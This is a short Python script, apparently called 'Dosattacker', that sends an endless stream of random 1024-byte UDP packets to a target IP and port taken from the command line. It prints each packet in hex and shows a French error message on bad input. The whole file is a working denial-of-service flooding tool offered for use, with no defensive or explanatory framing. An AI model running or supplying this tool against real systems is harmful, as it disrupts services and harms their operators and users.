import socket
import random
from optparse import OptionParser

parser = OptionParser("""
Dosattacker
[options]:
    -t: target_IP
    -p: port
Exemple: python Dos_attacker.py -t 192.168.1.1 _p 80 """)

parser.add_option("-t", dest="target_IP", help="Enter your target_IP")
parser.add_option("-p", dest="port", help="Enter the port")
(option, args) = parser.parse_args()

try:
    target_IP = option.target_IP
    port=int(option.port)

    def Dos_attack(target_IP, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(1024)
        while True:
            sock.sendto(packet,(target_IP,port))
            print(packet.encode('hex'))

except:
    parser.error("L'exemple est devant vous !")

Dos_attack(target_IP,port)